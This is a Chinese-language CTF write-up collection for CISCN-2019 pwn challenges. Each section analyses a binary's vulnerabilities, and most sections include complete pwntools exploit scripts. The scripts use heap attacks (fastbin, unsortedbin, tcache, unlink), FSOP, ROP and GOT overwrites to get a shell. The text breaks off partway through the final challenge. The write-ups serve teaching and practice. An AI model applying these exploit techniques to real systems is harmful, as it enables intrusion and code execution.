# ciscn-2019-pwn系列



# 简要介绍

发现在`buu`上做了很多`ciscn-2019`的题目，那直接搞个大合集。尽量收录所有的`ciscn-2019-pwn`的题目。

<!-- more -->

# c系列

### ciscn-2019-c-7

### 总结

主要是限制了`UAF`的`chunk`的大小为`0x20`，并且限制了`add`的次数，就很难受，并且题目用的还是`calloc`，没有使用`tcache`。最后还是使用`fastbin attack`+`unsortedbin attack` + `FSOP`获取到的`shell`。                                                                                                                                                                                                                                                                                          

- `fastbin attack`用于修改`chunk size`
- `unsortedbin attack`用于修改`fast_global_max`
- `FSOP`利用`IO_str_finish`拿`shell`

<!-- more -->

### 题目分析

#### checksec

![image-20210905163450354](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20210905163450354.png)

#### 题目分析

#### 结构体

逆向分析出`Servent`的结构体如下：

```c
struct Servent
{
  char *name;
  uint64_t aggressivity; // 攻击力
};
```



#### 漏洞点

漏洞`1`：`recruite`中的`size`可以为负数，下面做减法就会得到一个很大的正数，这样先把`money`搞到很大

![image-20210905163700580](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20210905163700580.png)

漏洞`2`：`expel`分支

![image-20210905163812863](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20210905163812863.png)

漏洞`3`：可以任意地址置为`0`，这个漏洞我没用到。但是隐约猜到了用处。

![image-20210905163948660](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20210905163948660.png)



别的漏洞就没看到了。

### 利用过程

- 利用漏洞`1`将`money`搞到很大
- 利用漏洞`2`，修改某个`chunk`的`size`，泄露出堆和`libc`地址
- 还是利用漏洞`2`，进行`unsortedbin attack`，打`global_max_fast`
- 释放一个很大的`chunk`，刚好覆盖掉`_IO_list_all`
- 利用`FSOP`拿`shell`

### Exp

```python
#!/usr/bin/python3
from pwncli import *

cli_script()

p:tube = gift['io']
elf:ELF = gift['elf']
libc: ELF = gift['libc']


def recruite(size:(tuple, list), name:(tuple, list)):
    p.sendlineafter("Give me your choice:\n", "1")
    p.sendlineafter("How many servents do you want to rescruit?\n", str(len(size)))
    for i in range(len(size)):
        p.sendlineafter("Input the name's size of this servent:\n", str(size[i]))
        p.sendafter("Input the name of this servent:\n", name[i])


def expel(idx:int):
    p.sendlineafter("Give me your choice:\n", "2")
    p.sendlineafter("Tell me his index number:\n", str(idx))
    p.recvuntil("Ok, I'll kill ")
    msg = p.recvline()
    info("msg recv: {}".format(msg))
    return msg


def buy_weapon(weapon_type:int):
    p.sendlineafter("Give me your choice:\n", "3")
    p.sendlineafter("2.Excalibur      --90000yuan\n", str(weapon_type))


def attack_boss(use_big_weapon='n'):
    p.sendlineafter("Give me your choice:\n", "4")
    msg = p.recvline()
    if  b"Do you want to use excalibur?" in msg:
        p.sendline(use_big_weapon)

# 搞钱
p.sendlineafter("How much money do you want?\n", "-1")
p.sendlineafter("Give me your choice:\n", "1")
p.sendlineafter("How many servents do you want to rescruit?\n", str(-10000))

buy_weapon(2)

# 为堆风水布局
recruite([0x18, 0x18, 0x18, 0x2000], [flat(0, 0x21), flat(0, 0x21), flat(0, 0x21), flat({0x400:[[0, 0x21, 0, 0] * 2], 0x1410:[[0, 0x21, 0, 0] * 2]})])

expel(1)
expel(1)

# 泄露堆地址 
leak_addr = expel(1)

heap_base_addr = u64(leak_addr[:6].ljust(8, b"\x00")) - 0x2a0

log_address("heap_base_addr", heap_base_addr)

# fastbin attack
for _ in range(5):
    expel(1)

expel(0)
expel(1)
expel(0)

recruite([0x18], [flat([0, 0x21, heap_base_addr + 0x280], length=0x18)])

# change size
recruite([0x40, 0x18], ["a", flat(0, 0x71)])

for i in range(8):
    expel(1)

# 改完size后得到一个大的chunk，释放它
expel(0)

recruite([0x60], [flat({0:heap_base_addr + 0x2e0, 0x30: [0, 0x471]})])

expel(2)

# 泄露libc地址
leak_addr = expel(1)
libc_base_addr = u64(leak_addr[:6].ljust(8, b"\x00")) - 0x3ebca0
log_address("libc_base_addr", libc_base_addr)

libc.address = libc_base_addr

expel(0)

# unsortedbin attack
global_max_fast_offset = 0x3ed940
recruite([0x60], [flat({0x30:[0, 0x471, 0, libc_base_addr + global_max_fast_offset - 0x10]}, filler="\x00")])

expel(0)

str_jumps_offset = 0x3e8360
lock_offset = 0x3ed8c0
bin_sh_offset = 0x1b3e9a

payload = flat({
    0x30: [0, 0x1441],
    0x30+0x80: 0,
    0x30+0x88: libc_base_addr + lock_offset, # lock
    0x30+0xc0: 0,
    0x30+0x28: 0xffffffffffffff, # write_ptr
    0x30+0xd8: libc_base_addr + str_jumps_offset - 8, # IO_str_jumps
    0x30+0x38: libc_base_addr + bin_sh_offset, # /bin/sh
    0x30+0xe8: libc.sym['system']
}, filler="\x00")

recruite([0x460], [payload])

# 覆盖掉_IO_list_all
expel(3)

# 执行exit
attack_boss()

p.interactive()
```

构造大的`chunk`：

![image-20210905164720758](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20210905164720758.png)

`unsortedbin attack`:

![image-20210905164816865](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20210905164816865.png)

覆盖掉`_IO_list_all`：

![image-20210905165000433](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20210905165000433.png)

最后拿到`shell`：

![image-20210905183820599](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20210905183820599.png)

# n系列

## ciscn-2019-n-7

### 解题思路

- 利用溢出修改指针的洞，将指针修改到`stdout`结构体上方，修改`flag`为`0xfbad1800`，然后修改`IO_write_base`为`__environ`地址，`IO_write_ptr`为`__environ + 8`地址，泄露栈地址
- 劫持`__libc_start_main`栈帧的`retaddr`，使用`rop`执行`system("/bin/sh")`
- 这里用`pwncli`来写`exp`，只图高效，快捷

<!-- more -->

### exp

```python
#!/usr/bin/python3
from pwncli import *

cli_script()

if gift['remote']:
    libc = ELF('libc-2.23.so')
elif gift['debug']:
    libc = gift['libc']

def add_page(p, size, name):
    p.sendlineafter("Your choice-> \n","1")
    p.sendlineafter("Length: \n", str(size))
    p.sendafter("name:\n", name)
    p.recvline()
    
def edit_page(p, name, content):
    p.sendlineafter("Your choice-> \n","2")
    p.recvline()
    p.send(name)
    p.sendafter("contents:\n", content)
    

def show_page(p):
    p.sendlineafter("Your choice-> \n","3")
    msg1 = p.recvline()
    msg2 = p.recvline()
    return msg1, msg2
    
def get_gift(p):
    p.sendlineafter("Your choice-> \n","666")
    msg = p.recvline()
    info(msg)
    return msg


def attack(p):
    # leak libc addr
    leak_libc_addr = int16(get_gift(p).decode())
    libc.address = leak_libc_addr - libc.sym['puts']
    log_address("libc base addr", libc.address)

    stdout_addr = libc.sym['_IO_2_1_stdout_']
    environ_addr = libc.sym['__environ']

    # hijack stdout to leak stack addr
    add_page(p, 0x100, flat(0xdeadbeef, stdout_addr))
    edit_page(p, "a", flat([0xfbad1800, [environ_addr] * 4, environ_addr + 8]))
    # get stack addr
    leak_stack_addr = u64(p.recvn(8))
    log_address("leak_stack_addr", leak_stack_addr)
    stackframe_ret_addr = leak_stack_addr - 0xf0
    # rop
    bin_sh_offset = libc.search(b"/bin/sh").__next__()
    rop = ROP(libc, base=libc.address)
    rop.call('system', [bin_sh_offset])
    payload = rop.chain()

    p.sendlineafter("Your choice-> ","2")
    p.sendafter("name:", flat(0xdeadbeef, stackframe_ret_addr))
    p.sendafter("contents:", payload)
    p.sendlineafter("Your choice-> ","5")
    
    p.interactive()
    
    
attack(gift['io'])

    
```



# ne系列

## ciscn-2019-ne-3

### 总结

一道很无语的`rop`的题目，由于在`puts`调用中会卡在`[ebp - 0x46c]`这样的语句，所以只能把栈往抬高，避免访问到不可写的内存区域。

- 如果题目给的`rop`很短，那么需要想办法调用`read`写入更长的`rop`链
- 必要的时候需要把栈抬高，避免在函数调用过程中，让不可写的内存写入了东西，直接`core dump`
- `call`的时候会放置下一条指令到`esp`，但如果直接覆写了`esp`，那么还是可以继续劫持程序流

<!-- more -->

### 题目分析

#### checksec

很久没碰到`32`位的题目了，环境为`libc-2.27.so`

![image-20210912160406760](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20210912160406760.png)

#### 函数分析

最开始的时候，`IDA`无法识别函数。只需要在`__printf_chk`这个函数上按下`Y`，修改函数签名为`int __printf_chk(int, const char*, ...);`即可

流程很简单，先往`bss`段上写数据，然后有整数溢出和栈溢出：

![image-20210912160631922](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20210912160631922.png)

![image-20210912160709015](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20210912160709015.png)

刚开始以为是很简单的栈溢出，后来瞅了眼`main`函数退出的时候的汇编，发现栈直接被改变了：

![image-20210912160859021](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20210912160859021.png)

这里的`esp`来自于`ecx`，而`ecx`可控。没有地址泄露，所以只能往`bss`段搞栈迁移。

所以一开始直接准备：

- `puts`泄露地址
- 重新执行`main`
- 再次`rop`执行`system(/bin/sh)`、

然而事情，并没有那么简单，在调用`puts`的时候，由于栈太低了，会往更低处的不可写的区域赋值，程序直接`GG`。然后想改成`__printf_chk`，也遇到了类似的问题。

所以只能找一下`read`函数，然后重新写一段长的`rop`，并把栈抬到高处，再进行泄露和利用。

在输入`passwd`长度的时候，只能写入`0x10`个字节。去掉要转化为负数的`-1\x00\x00`，只剩`12`个字节可以操作。如果直接`rop`，由于`read`有`3`个参数，所以至少需要`0x14`的大小，很显然这里不够。所以只能利用程序中的`call read`这样的汇编执令来缩小`rop`的长度。

我们必须要控制的参数有`read`的第二个和第三个参数，指明往`bss`段写和写的大小。那么第一个参数`fd`就没法控制，好在程序中就有，如下图：

![image-20210912161735548](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20210912161735548.png)

有一个`push 0`，省了不少事情。

因此，最终的解题思路为：

- 将栈迁移到`bss`段

- `rop`往`buf`区域写更长的`rop`
- 将栈抬高
- 执行`puts`泄露地址
- 再次执行`read`读入`rop`
- 执行`system(/bin/sh)`

这里还是不能回到`main`函数，还是会出现往非法内存区域写入的操作。索性直接再次读入`rop`，然后刚好`esp`也在`bss`段上，所以可控制执行`system(/bin/sh)`

### Exp

```python
#!/usr/bin/python3
from pwncli import *

cli_script()

p:tube = gift['io']
elf:ELF = gift['elf']
libc: ELF = ELF('libc-2.27-32bit.so')

"""
输入负数即可绕过校验
之后进行rop
"""
buffer_addr = 0x0804A060
puts_addr = 0x8048490
puts_got_addr = 0x804A01C
main_addr = 0x80486ea

read_addr = 0x8048460

p.sendafter("Now, Challenger, What's name?\n:", "aaaaaa")
p.sendafter("Please set the length of password: ", b"-1\x00\x00"+p32(0x8048793)+p32(buffer_addr)+p32(0xf00))

p.sendlineafter(":", flat("a"*72, 
buffer_addr+8, # ecx
0, #ebx
0, # edi
buffer_addr + 0xf00, # ebp
))

sleep(1)
payload = flat({
    0:[0x080487B3, buffer_addr+0x500, 0, 0, buffer_addr+0xf00],
    0x500-4: [puts_addr, 0x08048431, puts_got_addr, read_addr, 0, 0, buffer_addr, 0xf00]
}, filler="\x00")

p.send(payload)

msg = p.recvuntil("\xf7")

libc_base_addr = u32(msg[-4:]) - libc.sym['puts']
log_libc_base_addr(libc_base_addr)
libc.address = libc_base_addr

sleep(1)

p.send(flat("/bin/sh\x00", cyclic(0x4ec-8), libc.sym['system'], 0, buffer_addr))

p.interactive()

```

栈迁移：

![image-20210912162318146](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20210912162318146.png)

泄露地址：

![image-20210912162424638](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20210912162424638.png)

第二次`read`：

![image-20210912162453753](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20210912162453753.png)

拿`shell`：

![image-20210912162712826](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20210912162712826.png)



远程打：

![image-20210912162150712](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20210912162150712.png)

# final系列

## ciscn_2019_final_5

### 总结

根据本题，学习与收获有：

- `tcache bin`的利用都不需要伪造`chunk`，直接修改`tcache chunk`的`next`指针即可。但是`libc2.27`之后的版本加入了检查。
- `tcache bin dup`，也不存在检查，当有`UAF`漏洞的时候，可以直接对`tcache chunk`多次释放。
- `tcache chunk`不会和`top_chunk`合并。
- 题目要读仔细，对于一些奇怪的操作，可以复现一下，加快分析速度！

<!-- more -->

### 题目分析

#### checksec

![](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210307150104.png)

没有开启PIE防护。

#### 函数分析

##### main

![](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210307150232.png)

可以看出来，是个很经典的菜单题。

##### menu

![](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210307150310.png)

提供三个选择，接下来依次来看

##### new_note

![](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210307150435.png)

![](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210307150507.png)

这个函数要注意以下几点：

- 输入索引的范围是`0~0x10`，也就是说最多可以存储17个`chunk`
- `malloc`的范围为`0~0x1000`
- 输出了每个`chunk`地址的低3个字节
- `0x6020e0`存储`chunk`的指针，但是存储的是**输入的`idx`和分配到的`chunk_ptr`的或值**
- **外部输入的`idx`和实际存放在`0x6020e0`数组的索引并不一致！！**



##### del_note

![](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210307150951.png)

![](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210307151033.png)

这里有两点要注意：

- 外部输入的`idx`并不是会对应去删除`0x6020e0[idx]`处的`chunk`，而是遍历`0x6020e0`处的数组，对每一个地址`ptr & 0xf`取出索引，再和外部输入的`idx`比较，如果一样，就去删除这个地方的`chunk`
- 找到索引后，取出的要删除的`chunk`的地址是通过`ptr & 0xfffffffffffffff0`计算得到的

##### edit_note

![](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210307151441.png)

这里寻找索引和取出`chunk`的方式和`del_note`是一样的。

#### 漏洞点

漏洞点就在于很奇怪的计算索引和计算`chunk`地址的方式，分析这两种计算方式，可以发现：

- 由于`chunk`的地址一定是页对齐的，所以分配堆的地址的最后一位肯定是`0x?0`。这个地址和`[0, 0xf]`之间的索引取**或**值，对地址前面的值是不影响的，如`0x20 | 0xf = 0x2f`。因此，这个时候使用`ptr & 0xf`取索引没问题，使用`ptr & 0xf0`取原来的`chunk`指针，也没问题。
- 但是，如果给的索引是`0x10`，那么就有问题了。举例说明：假设分配到的`chunk_ptr`地址的最后一位为`0x60`，那么按照`new_note`的存储方式，数组中最后存的地址为`0x60 | 0x10 = 0x70`。要取出索引，得输入`0x70 & 0xf = 0x0`，取出的`chunk_ptr`为`0x70 & 0xf0 = 0x70`。那么如果调用`del_note`或`edit_note`，实际上处理的地址不是`0x60`，而是为`0x70`。
- 也就是说，如果首先创建`0x10`为`idx`的`chunk`，调用`edit_note`的时候，要输入的索引实际不能是`0x10`，而是`0`，并且编辑的地址会往高地址移动`0x10`个字节。这可以**修改下一个`chunk`的`pre_size`和`size`域大小**。

### 利用思路

步骤：

- 分配一个`chunk A`，输入索引为`0x10`，大小为`0x10`
- 分配一个`chunk B`，输入索引为`0x1`，大小为`0x10`
- 分配一个`chunk C`，输入索引为`0x2`，大小为`0x10`
- 分配一个`chunk D`，输入索引为`0x3`，大小为`0x20`
- 分配一个`chunk E`，输入索引为`0x4`，大小为`0x10`，输入内容为`/bin/sh\x00`
- 通过`edit_note`接口，输入索引`0`，来修改`chunk B`的`size`为`0x71`，这是为了把`chunk C`和`chunk D`都囊括进来，制造`overlapped chunk`。
- 依次释放`chunk B `和`chunk C`和`chunk D`
- 分配一个`chunk F`，输入索引为`0x1`，大小为`0x60`，把刚刚释放那个假的`chunk`申请回来，并修改已经释放了的`chunk C`和`chunk D`的`next`指针
- 利用`tcache bin attack`分别分配`chunk G`到`free@got`处和`chunk H`到`setbuf@got`处，将`free@got`覆盖为`put@plt`，将`setbuf@got`填为`‘a’ * 8`。然后调用`del_note(chunk H)`，泄露出`atoi`函数的地址。
- 最后利用`edit_not`接口来修改`chunk G`，将`free@got`修改为`system`地址，最后`del_note(chunk E)`获取到`shell`

### EXP

#### 调试过程

首先，写好函数，并且也可以定义一个数组，存储`chunk`地址，模拟`0x6020e0`数组，同时，保证变化与程序一致。

```python
# x[0]存储低3位和索引的或值，x[1]以及真实的chunk地址
qword_0x6020e0 = [[0, 0]] * 17

def show_qword_0x6020e0():
    '''如果RealPtr（真实的chunk地址）和GetPtr（计算取出来的chunk地址）不一样的话，用绿色打印！'''
    global qword_0x6020e0
    addr = 0x6020e0
    for x in qword_0x6020e0:
        if x[0] == 0:
            continue
        fstr = 'Addr:{}  StorePtr:{}  RealPtr:{}  GetPtr:{}  GetIdx:{}'.format(hex(addr), hex(x[0]), hex(x[1]), hex(x[0] & 0xfff0),hex(x[0] & 0xf))
        if (x[1]) != (x[0] & 0xfff0):
            print_green('[*] ' + fstr)
        else:
            log.info(fstr)
        addr += 8

def new_note(idx:int, size:int, content:bytes=b'\x00'):
    global io, qword_0x6020e0
    assert idx >= 0 and idx <= 0x10
    io.sendlineafter("your choice: ", '1')
    io.sendlineafter("index: ", str(idx))
    io.sendlineafter("size: ", str(size))
    io.sendafter("content: ", content)
    low_bytes = io.recvline()
    log.info('get msg:{}'.format(low_bytes))
    low_bytes = low_bytes[12:-1]
    low_bytes = int16(low_bytes.decode())
    store_low = (low_bytes | idx)
    for i in range(0x11):
        if qword_0x6020e0[i][0] == 0:
            qword_0x6020e0[i] = [store_low, low_bytes]
            break
    return low_bytes, i


def del_note(idx:int):
    global io, qword_0x6020e0
    io.sendlineafter("your choice: ", '2')
    io.sendlineafter("index: ", str(idx))
    msg = io.recvline()
    count = -1
    for x in qword_0x6020e0:
        count += 1
        if (x[0] & 0xf) == idx:
            x[0] = 0
            x[1] = 0
            break
    return msg, count

def edit_note(idx:int, content:bytes):
    global io
    io.sendlineafter("your choice: ", '3')
    io.sendlineafter("index: ", str(idx))
    io.sendafter("content: ", content)
    io.recvuntil("edit success.\n\n")
```

按照利用思路分配`chunk`，并打印数组看看：

```python
# get chunk
new_note(0x10, 0x10) # idx 0 chunk A
new_note(0x1, 0x10) # idx 1 chunk B
new_note(0x2, 0x10) # idx 2 chunk C
new_note(0x3, 0x20) # idx 3 chunk D
new_note(0x4, 0x10, b'/bin/sh\x00') # idx 4 chunk E

show_qword_0x6020e0() # show array
```

的确是这样的：

![](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210307155954.png)

看下堆：

![](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210307160244.png)

![](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210307160305.png)



然后修改`size`域：

```python
# edit and overlap size field
edit_note(0, p64(0) + p64(0x71))
```

![](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210307160436.png)

释放这个假`chunk`：

```python
# del_note 1 chunk B and re-malloc it
del_note(1)
```

![](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210307160554.png)

重新`malloc`回来，然后释放`chunk C/D`，并修改它们的`next`指针：

```python
new_note(0x1, 0x60) # idx 1 chunk F

 # del_note 2 chunk C and 3 chunk D
del_note(2)
del_note(3)

# change the next pointer of freed chunk C and freed chunk D
payload = p64(0) * 3 + p64(0x21) + p64(0x602018) + p64(0) * 2 + p64(0x31) + p64(0x602070)
edit_note(1, payload)
```

![](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210307160839.png)

![](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210307160923.png)

分配到`free@got`和`setbuf@got`，并修改内容：

```python
# tcache attack
new_note(1, 0x10)
new_note(1, 0x20)

new_note(2, 0x10, p64(0x400790)) # idx 2, chunk G, change free@got to puts@plt
new_note(3, 0x20, b'a' * 8) # idx 3, chunk H, change setbuf@got to 'aaaaaaaa'
```

![](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210307161121.png)

看下数组：

![](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210307161223.png)



然后泄露并计算system的地址，再看下数组：

```python
# call del_note to leak __libc_atoi address and calculate __libc_system address
io.sendlineafter("your choice: ", '2')
io.sendlineafter("index: ", '3')
msg = io.recvline()
show_qword_0x6020e0() # show array
# edit_note, change free@got to __libc_system
atoi_addr = u64(msg[8:-1] + b'\x00\x00')
LOG_ADDR('atoi_addr', atoi_addr)
system_addr = atoi_addr + 0xedc0
edit_note(10, p64(system_addr) * 2)
```

![](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210307161418.png)

注意：要访问`chunk G`的话，得输入`idx`为`0xa`

![](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210307161456.png)

注意，这个时候`0x6020110`处的会被置空：

![](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210307161600.png)

修改成功：

![](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210307161811.png)

最后只需要`free chunk E`：

```python
# get shell
io.sendlineafter("your choice: ", '2')
io.sendlineafter("index: ", '4')
```

![](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210307161945.png)



#### 最终exp

```python
from pwn import *

io = process('./ciscn_2019_final_5')

# x[0]存储低3位和索引的或值，x[1]以及真实的chunk地址
qword_0x6020e0 = [[0, 0]] * 17

def show_qword_0x6020e0():
    '''如果RealPtr（真实的chunk地址）和GetPtr（计算取出来的chunk地址）不一样的话，用绿色打印！'''
    global qword_0x6020e0
    addr = 0x6020e0
    for x in qword_0x6020e0:
        if x[0] == 0:
            continue
        fstr = 'Addr:{}  StorePtr:{}  RealPtr:{}  GetPtr:{}  GetIdx:{}'.format(hex(addr), hex(x[0]), hex(x[1]), hex(x[0] & 0xfff0),hex(x[0] & 0xf))
        if (x[1]) != (x[0] & 0xfff0):
            print_green('[*] ' + fstr)
        else:
            log.info(fstr)
        addr += 8

def new_note(idx:int, size:int, content:bytes=b'\x00'):
    global io, qword_0x6020e0
    assert idx >= 0 and idx <= 0x10
    io.sendlineafter("your choice: ", '1')
    io.sendlineafter("index: ", str(idx))
    io.sendlineafter("size: ", str(size))
    io.sendafter("content: ", content)
    low_bytes = io.recvline()
    log.info('get msg:{}'.format(low_bytes))
    low_bytes = low_bytes[12:-1]
    low_bytes = int16(low_bytes.decode())
    store_low = (low_bytes | idx)
    for i in range(0x11):
        if qword_0x6020e0[i][0] == 0:
            qword_0x6020e0[i] = [store_low, low_bytes]
            break
    return low_bytes, i


def del_note(idx:int):
    global io, qword_0x6020e0
    io.sendlineafter("your choice: ", '2')
    io.sendlineafter("index: ", str(idx))
    msg = io.recvline()
    count = -1
    for x in qword_0x6020e0:
        count += 1
        if (x[0] & 0xf) == idx:
            x[0] = 0
            x[1] = 0
            break
    return msg, count

def edit_note(idx:int, content:bytes):
    global io
    io.sendlineafter("your choice: ", '3')
    io.sendlineafter("index: ", str(idx))
    io.sendafter("content: ", content)
    io.recvuntil("edit success.\n\n")

# get chunk
new_note(0x10, 0x10) # idx 0 chunk A
new_note(0x1, 0x10) # idx 1 chunk B
new_note(0x2, 0x10) # idx 2 chunk C
new_note(0x3, 0x20) # idx 3 chunk D
new_note(0x4, 0x10, b'/bin/sh\x00') # idx 4 chunk E

show_qword_0x6020e0() # show array

# edit and overlap size field
edit_note(0, p64(0) + p64(0x71))

# del_note 1 chunk B and re-malloc it
del_note(1)
new_note(0x1, 0x60) # idx 1 chunk F
 # del_note 2 chunk C and 3 chunk D
del_note(2)
del_note(3)

# change the next pointer of freed chunk C and freed chunk D
payload = p64(0) * 3 + p64(0x21) + p64(0x602018) + p64(0) * 2 + p64(0x31) + p64(0x602070)
edit_note(1, payload)

# tcache attack
new_note(1, 0x10)
new_note(1, 0x20)

new_note(2, 0x10, p64(0x400790)) # idx 2, chunk G, change free@got to puts@plt
new_note(3, 0x20, b'a' * 8) # idx 3, chunk H, change setbuf@got to 'aaaaaaaa'

# call del_note to leak __libc_atoi address and calculate __libc_system address
io.sendlineafter("your choice: ", '2')
io.sendlineafter("index: ", '3')
msg = io.recvline()

show_qword_0x6020e0() # show array

# edit_note, change free@got to __libc_system
atoi_addr = u64(msg[8:-1] + b'\x00\x00')
LOG_ADDR('atoi_addr', atoi_addr)
system_addr = atoi_addr + 0xedc0
show_qword_0x6020e0()
edit_note(10, p64(system_addr) * 2)

# get shell
io.sendlineafter("your choice: ", '2')
io.sendlineafter("index: ", '4')

io.interactive()
```







# es系列

## ciscn-2019-es-4

### 总结

很基础的`unlink`，只记录下`exp`，不对题目做过多的分析。注意一点，对于含有`tcache bin`的`glibc`版本，需要先把`tcache bin`填满，再`unlink`。

<!-- more -->

### EXP

```python
from pwn import *
int16 = lambda x : int(x, base=16)
LOG_ADDR = lamda: x, y: log.info("Addr: {} ===> {}".format(x, y))

sh:tube = process("./ciscn_2019_es_4")

context.arch="amd64"


libc = ELF('libc-2.27.so')

def ma(idx, size, data) -> int:
    assert idx > -1 and idx < 0x21, "idx error!"
    assert size > 0x7f and idx < 0x101, "size error!"
    sh.sendlineafter("4.show\n", "1")
    sh.sendlineafter("index:\n", str(idx))
    sh.sendlineafter("size:\n", str(size))
    gift = sh.recvline()
    info("msg recv:{}".format(gift))
    leak_addr = int16(gift[6:-1].decode())
    info("leak addr:0x%x" % leak_addr)
    sh.sendafter("content:\n", data)
    return leak_addr
    

def fr(idx):
    sh.sendlineafter("4.show\n", "2")
    sh.sendlineafter("index:\n", str(idx))


edit_flag = 0
def ed(idx, data):
    global edit_flag
    assert edit_flag != 2, "cannot edit!"
    sh.sendlineafter("4.show\n", "3")
    sh.sendlineafter("index:\n", str(idx))
    sh.sendafter("content:\n", data)


def show(idx):
    sh.sendlineafter("4.show\n", "4")
    sh.sendlineafter("index:\n", str(idx))
    msg = sh.recvline()
    info("msg recv:{}".format(msg))
    return msg

for i in range(7):
    ma(i, 0xf0, '{}'.format(i) * 0xf0)

leak_addr = ma(7, 0x88, "a")
LOG_ADDR("leak_heap_addr", leak_addr) # 0x9f0960

ma(8, 0xf0, "b")
ma(9, 0x80, "c")
ma(0xa, 0x80, "d")
ma(0xb, 0x80, "/bin/sh\x00")

for i in range(7):
    fr(i)

# unlink
target_addr = 0x602118

layout = [0, 0x81, target_addr - 0x18, target_addr - 0x10, "a" * 0x60, 0x80]
ed(7, flat(layout))

fr(8)

free_got = 0x601fa0
layout = [leak_addr + 0x190, leak_addr + 0x190, free_got, 0x602100]
ed(7, flat(layout))

fr(4)
fr(5)

# tcache bin attack
ma(0, 0x80, p64(0x6022b8))
ma(1, 0x80, "a")
ma(4, 0x80, "a" * 8) # change key2

# leak libc addr
msg = show(6)
free_addr = u64(msg[:-1].ljust(8, b"\x00"))
LOG_ADDR("free_addr", free_addr)

libc.address = free_addr - 0x97950
LOG_ADDR("libc_base_addr", libc.address)

# edit __free_hook to system-addr
layout = [[libc.sym['__free_hook']] * 3, 0x602100]
ed(7, flat(layout))

ed(4, p64(libc.sym['system']))

# free /bin/sh chunk to get shell
fr(0xb)

sh.interactive()
```

远程打效果：

![image-20210614174816372](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20210614174816372.png)

# sw系列

## ciscn-2019-sw-1

### 总结

根据本题，学习与收获有：
- 当`RELRO`保护为`NO RELRO`的时候，`init.array、fini.array、got.plt`均可读可写；为`PARTIAL RELRO`的时候，`ini.array、fini.array`可读不可写，`got.plt`可读可写；为`FULL RELRO`时，`init.array、fini.array、got.plt`均可读不可写。
- 程序在加载的时候，会依次调用`init.array`数组中的每一个函数指针，在结束的时候，依次调用`fini.array`中的每一个函数指针
- 当程序出现格式化字符串漏洞，但是需要写两次才能完成攻击，这个时候可以考虑改写`fini.array`中的函数指针为`main`函数地址，可以再执行一次`main`函数。一般来说，这个数组的长度为`1`，也就是说只能写一个地址。

<!-- more -->

### 题目分析

#### checksec
![](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210414231318.png)




#### 函数分析

##### main

![](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210414231359.png)

程序比较简单，只有一个`main`函数，而且就是格式化字符串漏洞。同时注意到，程序中有一个`sys`函数，里面调用了`system`。

##### sys

![](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210414231537.png)



#### 漏洞点

漏洞点很明显，就是`main`函数中的`格式化`字符串漏洞。可以并且格式化参数是一个栈变量而不是堆变量，相对来说利用难度要低一点。并且程序给了`system`函数，其实都不需要泄露地址。

### 利用思路

#### 知识点

- 程序在结束的时候会调用`fini.array`函数指针数组中的每一个回调函数。

  ![](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210414233654.png)

#### 利用过程

- 利用格式化字符串漏洞，将`fini.array[0]`改写为`main`函数地址，与此同时，将`printf@got`改写为`system@plt`，获得第二次执行`main`函数的机会
- 输入`/bin/sh`获取`shell`

### EXP

#### 调试过程

1. 测出`printf`格式化字符串的偏移

   输入：`aaaa%x,%x,%x,%x,%x,%x,%x,%x,%x,%x`

   ![](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210414232119.png)

   测量出偏移为`4`

2. 第一次改写`fini.array`和`printf@got`，直接手撸：

   ```python
   payload = b"%2052c%13$hn%31692c%14$hn%356c%15$hn"+ p32(0x804989c + 2) + p32(0x804989c) + p32(0x804979c)
   
   sh.recvline()
   sh.sendline(payload)
   ```

   **改写前**：

